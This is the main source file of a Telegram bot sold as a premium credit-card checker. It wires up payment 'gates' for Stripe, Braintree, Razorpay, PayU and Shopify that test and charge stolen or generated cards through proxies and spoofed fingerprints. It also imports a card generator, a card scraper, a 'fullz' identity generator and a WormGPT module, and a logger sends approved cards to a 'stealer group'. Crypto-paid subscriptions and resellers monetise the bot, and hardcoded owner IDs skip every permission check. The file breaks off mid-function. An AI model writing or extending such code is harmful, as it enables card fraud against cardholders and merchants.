#!/usr/bin/env python3
"""
================================================================================
  🎀 ONICHAN BOT - Secure Edition
  Premium CC Checker with Hot Sexy Anime Girls GIFs 4K
  Copyright © 2025 - All Rights Reserved
================================================================================
"""

import os
import sys
import http.server as _http_server
import threading as _threading

# ── Instant production health-check servers ───────────────────────────────────
# MUST run before ANY third-party import.  Uses only stdlib so it works
# even if the Python environment is missing packages.  Non-daemon threads
# keep the process alive (and port 5000 answering) even if a later import
# fails — this lets the Reserved VM health check pass and lets runtime logs
# capture the real error.
_early_srv_registry: dict = {}  # port → HTTPServer instance

def _start_health_srv(_port: int) -> None:
    try:
        class _OK(_http_server.BaseHTTPRequestHandler):
            def do_GET(self):
                body = b"OK"
                self.send_response(200)
                self.send_header("Content-Type", "text/plain")
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)
            def log_message(self, *_a): pass
        srv = _http_server.HTTPServer(("0.0.0.0", _port), _OK)
        _early_srv_registry[_port] = srv
        t = _threading.Thread(
            target=srv.serve_forever,
            daemon=True,  # daemon: keep_alive will replace us on port 5000
        )
        t.start()
        print(f"[bot] Health server up on :{_port}", flush=True)
    except OSError:
        pass  # port already bound elsewhere — that's fine

def _stop_early_health_srv(_port: int) -> None:
    srv = _early_srv_registry.pop(_port, None)
    if srv:
        try:
            srv.shutdown()
        except Exception:
            pass

_start_health_srv(5000)
# ─────────────────────────────────────────────────────────────────────────────

import re
import json
import requests
import random
import time
import logging
from logging.handlers import RotatingFileHandler

# ── Error log file (read by /geterror) ───────────────────────────────────────
ERROR_LOG_FILE = "/tmp/bot_errors.log"

class _TeeStream:
    """Write to both the original stream and the error log file."""
    def __init__(self, original, log_path):
        self._orig = original
        self._path = log_path
    def write(self, data):
        self._orig.write(data)
        if data.strip():
            try:
                with open(self._path, "a", encoding="utf-8") as f:
                    f.write(data)
            except Exception:
                pass
    def flush(self):
        self._orig.flush()
    def fileno(self):
        return self._orig.fileno()

# Redirect stderr so all Python exceptions/tracebacks land in the log file
sys.stderr = _TeeStream(sys.__stderr__, ERROR_LOG_FILE)

# Also wire up the logging module to append WARNING+ to the same file
_log_handler = RotatingFileHandler(ERROR_LOG_FILE, maxBytes=2 * 1024 * 1024,
                                    backupCount=1, encoding="utf-8")
_log_handler.setLevel(logging.WARNING)
_log_handler.setFormatter(logging.Formatter(
    "%(asctime)s [%(levelname)s] %(name)s: %(message)s"))
logging.getLogger().addHandler(_log_handler)
# ─────────────────────────────────────────────────────────────────────────────
import asyncio
import aiohttp
from datetime import datetime
from typing import Optional
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes, MessageHandler, filters, PreCheckoutQueryHandler
from telegram import LabeledPrice
from telegram.constants import ParseMode
from telegram.error import RetryAfter, TimedOut, NetworkError, BadRequest, Forbidden, TelegramError
import html
from html import escape as html_escape
from config import *

def sanitize_ai_response(text: str) -> str:
    """Sanitize AI response for Telegram HTML - escape HTML and format code blocks"""
    if not text:
        return ""
    
    text = html_escape(text)
    
    import re
    def replace_code_block(match):
        lang = match.group(1) or ""
        code = match.group(2)
        return f"<pre><code class=\"language-{lang}\">{code}</code></pre>"
    
    text = re.sub(r'```(\w*)\n?(.*?)```', replace_code_block, text, flags=re.DOTALL)
    text = re.sub(r'`([^`]+)`', r'<code>\1</code>', text)
    text = re.sub(r'\*\*([^*]+)\*\*', r'<b>\1</b>', text)
    text = re.sub(r'__([^_]+)__', r'<u>\1</u>', text)
    
    return text

from modules.gate_checker import check_card_php, format_gate_response
from modules.approved_cards_logger import log_approved_card, get_approved_cards, get_approved_count, get_user_approved_cards, set_stealer_group_id, get_stealer_group_id, send_to_stealer_group
from modules.premium_plans import generate_invoice, get_all_plans, get_plan_info, get_total_revenue, get_payment_stats
from modules.premium_keys import create_key, redeem_key, validate_key, get_all_keys, get_active_keys, get_key_stats, create_batch_keys, format_keys_display, burn_unused_keys
from modules.cc_cleaner import (
    extract_cards_from_junk, clean_and_format_cards, remove_duplicates,
    filter_by_bin, filter_by_country, filter_by_brand, sort_cards, get_statistics
)
from modules.cc_generator import generate_cards, parse_gen_format, get_card_brand, validate_generated_card
from modules.shopify_auto import check_shopify_auto, get_site_product_info
from modules.user_config import (
    get_user_config, set_user_site, set_user_proxy, 
    clear_user_site, clear_user_proxy, get_user_sites, 
    get_user_proxies, remove_user_site, remove_user_proxy,
    clear_all_sites, clear_all_proxies, clean_invalid_sites,
    check_proxy_live, get_user_email, set_user_email, clear_user_email,
    get_captcha_key, set_captcha_key, clear_captcha_key
)
from modules.oxapay import (
    create_invoice as cp_create_order, 
    get_pending_payments as cp_get_pending,
    check_payment_status as cp_query_order, 
    confirm_payment as cp_mark_complete,
    activate_premium as cp_activate_premium,
    PREMIUM_PLANS as cp_get_plans,
    SUPPORTED_CRYPTOS as cp_supported_cryptos,
    format_payment_message as oxa_format_payment
)
CRYPTO_PLANS = cp_get_plans
from modules.auto_hitter import (
    extract_checkout_url, detect_url_type, charge_card as auto_hitter_charge,
    check_single_card,
    parse_card as auto_hitter_parse_card, parse_cards as auto_hitter_parse_cards,
    format_checkout_info, format_charge_result, mask_card, full_card,
    format_card_result, format_mass_summary, try_all_approaches,
    get_user_proxies as ah_get_user_proxies, add_user_proxy as ah_add_user_proxy, 
    remove_user_proxy as ah_remove_user_proxy, get_user_proxy as ah_get_user_proxy,
    get_user_email as ah_get_user_email, set_user_email as ah_set_user_email, 
    remove_user_email as ah_remove_user_email,
    get_proxy_info as ah_get_proxy_info, check_proxy_alive as ah_check_proxy_alive, 
    check_proxies_batch as ah_check_proxies_batch, obfuscate_ip as ah_obfuscate_ip,
    check_checkout_active as ah_check_checkout_active,
    fetch_checkout_page_data as ah_fetch_checkout_data,
    get_currency_symbol, get_proxy_url as ah_get_proxy_url,
    save_user_bin, get_user_saved_bins, delete_user_bin,
    parse_gen_input, generate_cards_from_bin,
    bulk_hit_cards
)
from modules.stripe_tls import get_checkout_info as tls_get_checkout_info
try:
    import stripe
except ImportError:
    stripe = None

# Fake Auto Hitter Response Mode
FAKE_AUTOHITTER_MODE = False

from modules import ton_monitor as _ton_monitor

# ─── Telegram Animated Premium Emojis (Semex Pack) ──────────────────────────
def _pe(emoji_id: str, fallback: str) -> str:
    return f'<tg-emoji emoji-id="{emoji_id}">{fallback}</tg-emoji>'

EMOJI = {
    "charged":    _pe("5895458739703517004", "✅"),
    "live":       _pe("5420315771991497307", "🔥"),
    "declined":   _pe("5852812849780362931", "❌"),
    "3ds":        _pe("5472308992514464048", "🔐"),
    "expired":    _pe("5413704112220949842", "⏰"),
    "error":      _pe("5213205860498549992", "⚠️"),
    "hitting":    _pe("5454415424319931791", "⌛️"),
    "stopped":    _pe("6325507973896472524", "🛑"),
    "welcome":    _pe("6325517457184261445", "👋"),
    "back":       _pe("5253997076169115797", "🔙"),
    "regenerate": _pe("6066348702363031988", "🔄"),
    "bolt":       _pe("5431449001532594346", "⚡️"),
    "crown":      _pe("5467406098367521267", "👑"),
    "ban":        _pe("6325636152900453913", "🤕"),
    "plan":       _pe("5197269100878907942", "✍️"),
    "ticket":     _pe("5418010521309815154", "🎫"),
    "stats":      _pe("5231200819986047254", "📊"),
    "users":      _pe("5453957997418004470", "👥"),
    "search":     _pe("5188217332748527444", "🔍"),
    "broadcast":  _pe("5424818078833715060", "📣"),
    "plug":       _pe("5195097801637243044", "🦏"),
    "link":       _pe("5271604874419647061", "🔗"),
    "trash":      _pe("5372825386591732174", "🗑"),
    "question":   _pe("5436113877181941026", "❓"),
    "blocked":    _pe("5240241223632954241", "🚫"),
    "free":       _pe("5406756500108501710", "🆓"),
    "card":       _pe("5267300544094948794", "💳"),
    "risky":      _pe("5895443668663275064", "🟡"),
    "danger":     _pe("5852753450382659113", "🔴"),
    "infinity":   _pe("6296372968754776071", "♾"),
    "lock":       _pe("5316858509571144216", "🔒"),
}

EMOJI_PLAIN = {
    "charged": "✅", "live": "🔥", "declined": "❌", "3ds": "🔐",
    "expired": "⏰", "error": "⚠️", "hitting": "⌛️", "stopped": "🛑",
    "welcome": "👋", "back": "🔙", "regenerate": "🔄", "bolt": "⚡️",
    "crown": "👑", "ban": "🤕", "plan": "✍️", "ticket": "🎫",
    "stats": "📊", "users": "👥", "search": "🔍", "broadcast": "📣",
    "plug": "🦏", "link": "🔗", "trash": "🗑", "question": "❓",
    "blocked": "🚫", "free": "🆓", "card": "💳", "risky": "🟡",
    "danger": "🔴", "infinity": "♾", "lock": "🔒",
}

PE_CHECK   = EMOJI["charged"]
PE_CROSS   = EMOJI["declined"]
PE_BOLT    = EMOJI["bolt"]
PE_FIRE    = EMOJI["live"]
PE_GEM     = EMOJI["crown"]
PE_TARGET  = EMOJI["bolt"]
PE_CARD    = EMOJI["card"]
PE_LINK    = EMOJI["link"]
PE_STORE   = EMOJI["bolt"]
PE_MAIL    = EMOJI["card"]
PE_CLOCK   = EMOJI["hitting"]
PE_LOCK    = EMOJI["3ds"]
PE_STOP    = EMOJI["stopped"]
PE_SAVE    = EMOJI["charged"]
PE_TRASH   = EMOJI["trash"]
PE_KEY     = EMOJI["lock"]
PE_PROC    = EMOJI["bolt"]

EID = {
    "charged":    "5895458739703517004",
    "live":       "5420315771991497307",
    "declined":   "5852812849780362931",
    "3ds":        "5472308992514464048",
    "expired":    "5413704112220949842",
    "error":      "5213205860498549992",
    "hitting":    "5454415424319931791",
    "stopped":    "6325507973896472524",
    "welcome":    "6325517457184261445",
    "back":       "5253997076169115797",
    "regenerate": "6066348702363031988",
    "bolt":       "5431449001532594346",
    "crown":      "5467406098367521267",
    "ban":        "6325636152900453913",
    "plan":       "5197269100878907942",
    "ticket":     "5418010521309815154",
    "stats":      "5231200819986047254",
    "users":      "5453957997418004470",
    "search":     "5188217332748527444",
    "broadcast":  "5424818078833715060",
    "plug":       "5195097801637243044",
    "link":       "5271604874419647061",
    "trash":      "5372825386591732174",
    "question":   "5436113877181941026",
    "blocked":    "5240241223632954241",
    "free":       "5406756500108501710",
    "card":       "5267300544094948794",
    "risky":      "5895443668663275064",
    "danger":     "5852753450382659113",
    "infinity":   "6296372968754776071",
    "lock":       "5316858509571144216",
}

_ANIMATED_EMOJI = {
    "✨": "5368324170671202286", "🎀": "5454172415070315962",
    "💕": "5368324170671202286", "🌸": "5454388756867986435",
    "👑": "5467406098367521267", "🆔": "5422683699130933153",
    "📅": "5413704112220949842", "💳": "5267300544094948794",
    "✅": "5895458739703517004", "❌": "5852812849780362931",
    "📈": "5231200819986047254", "🌷": "5454388756867986435",
    "🌺": "5454388756867986435", "🦋": "5431449001532594346",
    "📱": "5407025283456835913", "🔮": "5361837567463399422",
    "🧚\u200d♀️": "5368324170671202286", "🧚": "5368324170671202286",
    "🔐": "5472308992514464048", "💖": "5368324170671202286",
    "💗": "5368324170671202286", "💓": "5368324170671202286",
    "⚡": "5431449001532594346", "🔥": "5420315771991497307",
    "💎": "5471952986970267163", "🚀": "5445284980978621387",
    "⭐": "5895578414672252671", "💰": "5375296873982604963",
    "💡": "5472146462362048818", "⏰": "5413704112220949842",
    "🎮": "5467583879948803288", "🏆": "5409008750893734809",
    "🎬": "5375464961822695044", "🎨": "5431456208487716895",
    "📊": "5231200819986047254", "🔄": "5454415424319931791",
    "🚫": "6325636152900453913", "🛑": "6325507973896472524",
    "🔍": "5188217332748527444", "📢": "5424818078833715060",
    "🗑️": "5372825386591732174", "❓": "5436113877181941026",
    "⚠️": "5213205860498549992", "🔗": "5271604874419647061",
    "🆓": "5406756500108501710", "🎫": "5418010521309815154",
    "☎️": "5465169893580086142", "🔒": "5472308992514464048",
    "💸": "5472030678633684592", "🪙": "5379600444098093058",
    "🎖": "5332547853304734597", "🏅": "5334644364280866007",
    "⏳": "5451732530048802485", "💻": "5431376038628171216",
    "🎤": "5382360961313152917", "🎸": "5465665777619204788",
    "💜": "5368324170671202286", "💬": "5472146462362048818",
    "🔢": "5231200819986047254", "💠": "5471952986970267163",
    "🏦": "5375296873982604963", "🌍": "5445284980978621387",
    "⏱": "5413704112220949842", "👤": "5453957997418004470",
    "📉": "5231200819986047254", "📝": "5197269100878907942",
    "📌": "5431449001532594346", "🏪": "5375296873982604963",
    "📋": "5197269100878907942", "👥": "5453957997418004470",
    "📣": "5424818078833715060",
}

_SORTED_ANIM_KEYS = sorted(_ANIMATED_EMOJI.keys(), key=len, reverse=True)

def ae(text):
    if '<tg-emoji' in text:
        return text  # already processed — prevent double-wrapping
    for emoji_char in _SORTED_ANIM_KEYS:
        if emoji_char in text:
            eid = _ANIMATED_EMOJI[emoji_char]
            text = text.replace(emoji_char, f'<tg-emoji emoji-id="{eid}">{emoji_char}</tg-emoji>')
    return text

def _btn(text, style="danger", icon=None, **kwargs):
    return InlineKeyboardButton(text, style=style, icon_custom_emoji_id=icon, **kwargs)


# ── Magic button themes ───────────────────────────────────────────────────────
# Each theme maps button slots to EID animated-emoji IDs + a label for the Magic button.
# The theme index is encoded in callback_data so no per-user server state is needed.
_MAGIC_THEMES = [
    {   # 0 — Default (sparkle)
        "gates": EID["live"],     "tools": EID["bolt"],
        "premium": EID["crown"],  "stats": EID["stats"],
        "help": EID["question"],  "admin": EID["crown"],   "channel": EID["broadcast"],
        "magic": EID["welcome"],  "label": "✨ Magic",
    },
    {   # 1 — Fire / Danger
        "gates": EID["danger"],   "tools": EID["hitting"],
        "premium": EID["risky"],  "stats": EID["error"],
        "help": EID["blocked"],   "admin": EID["ban"],     "channel": EID["broadcast"],
        "magic": EID["stopped"],  "label": "🔥 Magic",
    },
    {   # 2 — Emerald / Success
        "gates": EID["free"],     "tools": EID["regenerate"],
        "premium": EID["infinity"],"stats": EID["plan"],
        "help": EID["ticket"],    "admin": EID["crown"],   "channel": EID["link"],
        "magic": EID["back"],     "label": "🌟 Magic",
    },
    {   # 3 — Royal / Crown
        "gates": EID["crown"],    "tools": EID["card"],
        "premium": EID["lock"],   "stats": EID["users"],
        "help": EID["search"],    "admin": EID["plug"],    "channel": EID["broadcast"],
        "magic": EID["regenerate"],"label": "👑 Magic",
    },
    {   # 4 — Cyber / Neon
        "gates": EID["charged"],  "tools": EID["infinity"],
        "premium": EID["3ds"],    "stats": EID["search"],
        "help": EID["link"],      "admin": EID["lock"],    "channel": EID["plug"],
        "magic": EID["risky"],    "label": "🔮 Magic",
    },
    {   # 5 — Electric / Wild
        "gates": EID["hitting"],  "tools": EID["danger"],
        "premium": EID["expired"],"stats": EID["trash"],
        "help": EID["blocked"],   "admin": EID["ban"],     "channel": EID["stopped"],
        "magic": EID["bolt"],     "label": "⚡ Magic",
    },
]

_MAGIC_TOASTS = [
    "✨ Magic loading...", "🔥 Power up!",   "🌟 Enchanting...",
    "👑 Royal mode!",     "🔮 Mystic shift!", "⚡ Electrifying!",
]


def _build_start_keyboard(theme_idx: int, owner: bool) -> "InlineKeyboardMarkup":
    """Build the /start inline keyboard for the given magic theme index."""
    t = _MAGIC_THEMES[theme_idx % len(_MAGIC_THEMES)]
    next_idx = (theme_idx + 1) % len(_MAGIC_THEMES)
    keyboard = [
        [
            _btn("Gates",   style="danger",  icon=t["gates"],   callback_data="gates"),
            _btn("Tools",   style="success", icon=t["tools"],   callback_data="tools"),
        ],
        [
            _btn("Premium", style="success", icon=t["premium"], callback_data="premium"),
            _btn("Stats",   style="danger",  icon=t["stats"],   callback_data="info"),
        ],
    ]
    if owner:
        keyboard.append([
            _btn("Help",  style="default", icon=t["help"],  callback_data="help_menu"),
            _btn("Admin", style="primary", icon=t["admin"], callback_data="admin"),
        ])
    else:
        keyboard.append([
            _btn("Help",    style="default", icon=t["help"],    callback_data="help_menu"),
            _btn("Channel", style="primary", icon=t["channel"],
                 url=f"https://t.me/{CHANNEL_USERNAME}"),
        ])
    keyboard.append([
        _btn(t["label"], style="primary", icon=t["magic"], callback_data=f"magic:{next_idx}"),
    ])
    return InlineKeyboardMarkup(keyboard)

# ─────────────────────────────────────────────────────────────────────────────

_bot_start_time = time.time()

_pending_hits = {}
_pending_bin_hits = {}
_active_hits = {}
_checked_proxies = {}

def _load_proxy_modes() -> dict:
    try:
        from config import PROXY_MODE_FILE
        if os.path.exists(PROXY_MODE_FILE):
            with open(PROXY_MODE_FILE, 'r') as f:
                return json.load(f)
    except:
        pass
    return {}

def _save_proxy_modes(data: dict):
    try:
        from config import PROXY_MODE_FILE
        os.makedirs(os.path.dirname(PROXY_MODE_FILE), exist_ok=True)
        with open(PROXY_MODE_FILE, 'w') as f:
            json.dump(data, f, indent=2)
    except:
        pass

def get_user_proxy_mode(user_id: int) -> str:
    modes = _load_proxy_modes()
    return modes.get(str(user_id), "system")

def set_user_proxy_mode(user_id: int, mode: str):
    modes = _load_proxy_modes()
    modes[str(user_id)] = mode
    _save_proxy_modes(modes)

def _pick_proxy(user_id: int = None) -> str:
    from config import SYSTEM_PROXIES
    if user_id:
        mode = get_user_proxy_mode(user_id)
        if mode == "own":
            user_proxies = ah_get_user_proxies(user_id)
            if user_proxies:
                return random.choice(user_proxies)
    if SYSTEM_PROXIES:
        return random.choice(SYSTEM_PROXIES)
    return None

def _cleanup_pending_hits():
    import time as _t
    now = _t.time()
    expired = [k for k, v in _pending_hits.items() if now - v.get("ts", 0) > 600]
    for k in expired:
        del _pending_hits[k]
from modules.rpp_gate import check_razorpay, parse_card as rpp_parse_card
from modules.rz_gate import check_rz, check_rz_async, format_rz_response, check_mass_rz_async
from modules.payu_gate import check_payu, check_payu_async, format_payu_response, check_mass_payu_async
from modules.str_gate import check_str
from modules.b3n_gate import check_b3n
from modules.b3_gate import check_b3, mass_check_b3
from modules.ast_gate import check_ast, mass_check_ast
from modules.bin_lookup import lookup_bin, format_mass_card_result, format_mass_header
from modules.chatgpt import ask_ai

from modules.credits import (
    init_credits_tables, get_balance, add_credits, deduct_credits,
    transfer_credits, generate_credit_voucher, redeem_voucher,
    get_gate_cost, get_transaction_history, get_all_vouchers,
)
from modules.reseller import (
    init_reseller_tables, is_reseller, add_reseller, remove_reseller,
    get_reseller_info, add_client, get_clients, get_all_resellers,
)
from modules.escrow import (
    init_escrow_tables, create_deal, get_deal, join_deal,
    confirm_deal, dispute_deal, admin_resolve_deal, get_user_deals,
    get_disputed_deals,
)
from modules.gate_monitor import (
    init_monitor_tables, record_check_result, get_gate_stats,
    run_gate_health_check, start_monitor,
)
from modules.channel_scraper import (
    init_scraper_tables, add_channel, remove_channel,
    get_active_channels, get_scraper_stats, process_channel_message,
)
from modules.hibp_watcher import (
    init_hibp_tables, add_watch, remove_watch,
    get_user_watches, start_watcher as start_hibp_watcher,
)
from modules.fingerprint_spoofer import get_spoofed_headers, get_random_proxy
from modules.fake_identity import generate_fullz
from modules.wormgpt import ask_wormgpt
from modules.database import (
    init_database,
    init_database_sync,
    init_supabase,
    is_db_connected,
    is_user_premium_sync,
    is_user_approved_sync,
    is_user_banned_sync,
    add_user_sync,
    approve_user_sync,
    ban_user_sync,
    unban_user_sync,
    set_premium_sync,
    remove_premium_sync,
    get_approved_users_sync,
    get_banned_users_sync,
    get_premium_users_sync,
    sync_log_card_check,
    sync_get_all_users,
    sync_get_pending_users,
    # MongoDB Aliases
    init_mongodb,
    mongodb_connected,
    mongo_is_owner,
    mongo_is_premium,
    mongo_is_banned,
    mongo_is_approved,
    mongo_add_user,
    mongo_approve_user,
    mongo_ban_user,
    mongo_unban_user,
    mongo_set_premium,
    mongo_remove_premium,
    mongo_get_all_users,
    mongo_get_pending_users,
    mongo_get_premium_users,
    mongo_log_card,
    # Supabase Aliases
    supabase_connected,
    supabase_is_premium,
    supabase_is_approved,
    supabase_is_banned,
    supabase_add_user,
    supabase_get_approved_users,
    supabase_get_banned_users,
    supabase_get_premium_users
)

# Keep alive for Replit
# Catch ALL exceptions — if keep_alive.py fails for any reason (import error,
# module missing, etc.) we fall back to a minimal Flask server so the production
# health-check at /ping always gets a 200, regardless of keep_alive.py status.
import os as _os_ka
try:
    from keep_alive import keep_alive
    REPLIT_MODE = True
except Exception as _ka_err:
    print(f"[warn] keep_alive import failed ({_ka_err}). Starting minimal health server instead.")
    from flask import Flask as _FallbackFlask
    from threading import Thread as _FallbackThread
    _fb_app = _FallbackFlask("health")

    @_fb_app.route("/ping")
    def _fb_ping():
        return "OK", 200

    @_fb_app.route("/")
    def _fb_home():
        return "<h1>Onichan Bot</h1><p>Starting up…</p>", 200

    def keep_alive():
        _PORT = int(_os_ka.environ.get("PORT", 8080))
        def _fb_run():
            try:
                from waitress import serve
                serve(_fb_app, host="0.0.0.0", port=_PORT, _quiet=True)
            except Exception:
                _fb_app.run(host="0.0.0.0", port=_PORT, threaded=True)
        _FallbackThread(target=_fb_run, daemon=True).start()

    REPLIT_MODE = True  # force-enable so keep_alive() is always called

# Also honour an explicit env-var override (set by start-bot.sh in production)
if _os_ka.environ.get("FORCE_WEB_SERVER"):
    REPLIT_MODE = True

# ============================================================================
# DATABASE MANAGEMENT
# ============================================================================

def ensure_database_files():
    """Create database files if they don't exist using centralized config"""
    init_database_sync()
    
    # Add owner if not exists
    if OWNER_ID > 0:
        try:
            with open(DB_OWNER, 'r') as f:
                owners = f.read()
            if str(OWNER_ID) not in owners:
                with open(DB_OWNER, 'a') as f:
                    f.write(f"{OWNER_ID}\n")
        except:
            with open(DB_OWNER, 'w') as f:
                f.write(f"{OWNER_ID}\n")
        
        if supabase_connected():
            supabase_add_user(OWNER_ID, OWNER_USERNAME, "approved")
            try:
                from modules.database import _execute_with_retry
                _execute_with_retry("""
                    UPDATE users SET is_owner = TRUE, premium = TRUE
                    WHERE user_id = %s
                """, (OWNER_ID,))
            except Exception as e:
                print(f"[DB] Failed to set owner flag: {e}")

# ─── Permission cache (TTL = 45 s) ───────────────────────────────────────────
import threading as _threading
import time as _perm_time

_PERM_TTL = 45           # seconds before a cached result expires
_HARDCODED_OWNERS = {8119946836, 8268257476, 8271254197}

class _PermCache:
    """Thread-safe TTL cache for per-user permission lookups."""
    def __init__(self):
        self._lock = _threading.Lock()
        self._store: dict = {}        # key -> (value, expire_ts)

    def get(self, key):
        with self._lock:
            entry = self._store.get(key)
            if entry and _perm_time.monotonic() < entry[1]:
                return entry[0], True
            return None, False

    def set(self, key, value, ttl=_PERM_TTL):
        with self._lock:
            self._store[key] = (value, _perm_time.monotonic() + ttl)

    def invalidate(self, user_id):
        """Call this when a user's permissions change (ban, premium set, etc.)."""
        with self._lock:
            for prefix in ("owner", "premium", "banned", "approved", "rank", "status"):
                self._store.pop(f"{prefix}:{user_id}", None)

    def clear(self):
        with self._lock:
            self._store.clear()

_perm_cache = _PermCache()

# ─── In-memory file caches (reloaded every 60 s) ─────────────────────────────
_file_cache: dict = {}   # path -> (set_of_ids, expire_ts)
_FILE_CACHE_TTL = 60

def _load_id_file(path: str) -> set:
    """Return a cached set of integer IDs from a newline-separated text file."""
    now = _perm_time.monotonic()
    entry = _file_cache.get(path)
    if entry and now < entry[1]:
        return entry[0]
    ids: set = set()
    try:
        if os.path.exists(path):
            with open(path, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.isdigit():
                        ids.add(int(line))
    except Exception:
        pass
    _file_cache[path] = (ids, now + _FILE_CACHE_TTL)
    return ids

def invalidate_user_cache(user_id: int):
    """Invalidate all cached data for a user (call after any permission change)."""
    _perm_cache.invalidate(user_id)
    # Also flush file caches so next read picks up the change
    _file_cache.clear()

# ─────────────────────────────────────────────────────────────────────────────

def is_owner(user_id):
    """Check if user is owner - checks multiple sources for resilience"""
    # Hardcoded admins
    if user_id in _HARDCODED_OWNERS:
        return True
    
    # Check config OWNER_ID first
    if user_id == OWNER_ID:
        return True

    # TTL cache check
    cached, hit = _perm_cache.get(f"owner:{user_id}")
    if hit:
        return cached

    result = False
    # Check PostgreSQL database
    if supabase_connected():
        from modules.database import is_user_owner_sync
        if is_user_owner_sync(user_id):
            result = True
    
    # Fallback to local file (cached in memory)
    if not result:
        if user_id in _load_id_file(DB_OWNER):
            result = True

    _perm_cache.set(f"owner:{user_id}", result)
    return result

def check_premium_status(user_id):
    """Check premium status - returns 'active', 'expired', or 'none'"""
    if user_id in _HARDCODED_OWNERS:
        return "active"
    if is_owner(user_id):
        return "active"

    cached, hit = _perm_cache.get(f"status:{user_id}")
    if hit:
        return cached

    status = "none"
    try:
        if supabase_connected():
            from modules.database import _execute_with_retry
            result = _execute_with_retry(
                "SELECT premium, premium_expiry, is_owner FROM users WHERE user_id = %s",
                (user_id,), fetch_one=True
            )
            if result:
                if result.get("is_owner"):
                    status = "active"
                elif result.get("premium"):
                    expiry = result.get("premium_expiry")
                    if expiry:
                        if isinstance(expiry, str):
                            expiry = datetime.fromisoformat(expiry.replace("Z", "+00:00"))
                        if hasattr(expiry, 'tzinfo') and expiry.tzinfo:
                            expiry = expiry.replace(tzinfo=None)
                        status = "active" if expiry > datetime.utcnow() else "expired"
                    else:
                        status = "active"
                elif result.get("premium_expiry"):
                    status = "expired"
    except Exception:
        pass

    _perm_cache.set(f"status:{user_id}", status)
    return status

def is_premium(user_id):
    """Check if user has premium access - DB is authoritative when connected, files are fallback only"""
    if user_id in _HARDCODED_OWNERS:
        return True
    if is_owner(user_id):
        return True

    cached, hit = _perm_cache.get(f"premium:{user_id}")
    if hit:
        return cached

    result = False
    try:
        if supabase_connected():
            result = supabase_is_premium(user_id)
    except Exception as e:
        print(f"[Premium] Database check failed for {user_id}: {e}")

    if not result:
        # File fallback — cached in memory
        try:
            if os.path.exists(DB_PREMIUM):
                with open(DB_PREMIUM, 'r') as f:
                    for line in f:
                        if line.strip():
                            parts = line.strip().split()
                            if len(parts) >= 1 and parts[0].isdigit() and int(parts[0]) == user_id:
                                if len(parts) >= 2:
                                    try:
                                        expiry = datetime.strptime(parts[1], "%Y-%m-%d")
                                        if expiry > datetime.now():
                                            result = True
                                            break
                                    except Exception:
                                        pass
                                else:
                                    result = True
                                    break
        except Exception:
            pass

    if not result:
        try:
            from config import DATABASE_DIR
            paid_file = os.path.join(DATABASE_DIR, "paid.txt")
            if os.path.exists(paid_file):
                with open(paid_file, 'r') as f:
                    for line in f:
                        if line.strip():
                            parts = line.strip().split()
                            if len(parts) >= 2 and parts[0].isdigit() and int(parts[0]) == user_id:
                                try:
                                    expiry = datetime.strptime(parts[1], "%Y-%m-%d")
                                    if expiry > datetime.now():
                                        result = True
                                        break
                                except Exception:
                                    pass
        except Exception:
            pass

    _perm_cache.set(f"premium:{user_id}", result)
    return result

def is_banned(user_id):
    """Check if user is banned - checks multiple sources"""
    cached, hit = _perm_cache.get(f"banned:{user_id}")
    if hit:
        return cached

    result = False
    if supabase_connected():
        if supabase_is_banned(user_id):
            result = True

    if not result:
        if user_id in _load_id_file(DB_BANNED):
            result = True

    _perm_cache.set(f"banned:{user_id}", result)
    return result

def is_approved(user_id):
    """Check if user is approved to use bot - checks multiple sources"""
    if is_owner(user_id):
        return True
    if is_banned(user_id):
        return False
    if not REQUIRE_APPROVAL:
        return True

    cached, hit = _perm_cache.get(f"approved:{user_id}")
    if hit:
        return cached

    result = False
    if supabase_connected():
        if supabase_is_approved(user_id):
            result = True

    if not result:
        if user_id in _load_id_file(DB_FREE):
            result = True

    if not result:
        result = is_premium(user_id)

    _perm_cache.set(f"approved:{user_id}", result)
    return result

def get_user_rank(user_id):
    """Get user rank"""
    cached, hit = _perm_cache.get(f"rank:{user_id}")
    if hit:
        return cached

    if is_banned(user_id):
        rank = "🚫 Banned"
    elif is_owner(user_id):
        rank = "👑 Owner"
    elif is_premium(user_id):
        rank = "💎 Premium"
    elif is_approved(user_id):
        rank = "✅ Approved"
    else:
        rank = "👤 Free"

    _perm_cache.set(f"rank:{user_id}", rank)
    return rank

def _get_user_rank_legacy(user_id):
    """Legacy stub — keep signature for any remaining callers."""
    if is_banned(user_id):
        return "🚫 Banned"
    if is_owner(user_id):
        return "👑 Owner"
    if is_premium(user_id):
        return "💎 Premium"
    if is_approved(user_id):
        return "🆓 Free"
    return "⏳ Pending"

def add_to_pending(user_id, username, first_name):
    """Add user to pending approval"""
    if supabase_connected():
        supabase_add_user(user_id, username, "pending")
    try:
        with open(DB_PENDING, 'a') as f:
            f.write(f"{user_id}|{username}|{first_name}|{datetime.now()}\n")
    except:
        pass


# ============================================================================
# TENOR GIF SEARCH - HOT SEXY ANIME GIRLS 4K
# ============================================================================

_gif_cache = {}
_gif_cache_lock = _threading.Lock()

def search_tenor_gif(query, limit=10):
    try:
        url = "https://tenor.googleapis.com/v2/search"
        params = {
            "q": query, "key": TENOR_API_KEY,
            "client_key": "nepali_momo_bot", "limit": limit,
            "media_filter": "gif", "contentfilter": "off"
        }
        response = requests.get(url, params=params, timeout=5)
        data = response.json()
        if "results" in data and len(data["results"]) > 0:
            gifs = []
            for result in data["results"]:
                if "media_formats" in result and "gif" in result["media_formats"]:
                    gifs.append(result["media_formats"]["gif"]["url"])
            return gifs
        return []
    except:
        return []

_GIF_QUERIES = {
    "welcome": ["sexy anime girl wink", "hot anime girl wave", "anime girl cute smile", "anime girl seductive"],
    "loading": ["anime girl waiting", "anime thinking", "anime girl loading"],
    "success": ["anime girl happy celebrate", "sexy anime victory", "anime girl excited"],
    "failed":  ["anime girl sad", "anime crying", "anime girl disappointed"],
    "premium": ["anime girl rich luxury", "anime queen vip", "anime girl powerful"],
    "admin":   ["anime girl boss", "anime queen powerful", "anime girl confident"],
    "banned":  ["anime girl angry", "anime mad furious", "anime girl serious"],
}
_gif_pending = set()  # queries currently being fetched (background)

def _refresh_gif_cache_bg(query):
    """Fire-and-forget background fetch — never blocks any caller."""
    if query in _gif_pending:
        return
    _gif_pending.add(query)
    import threading
    def _w():
        try:
            gifs = search_tenor_gif(query, 8)
            if gifs:
                with _gif_cache_lock:
                    _gif_cache[query] = gifs
        finally:
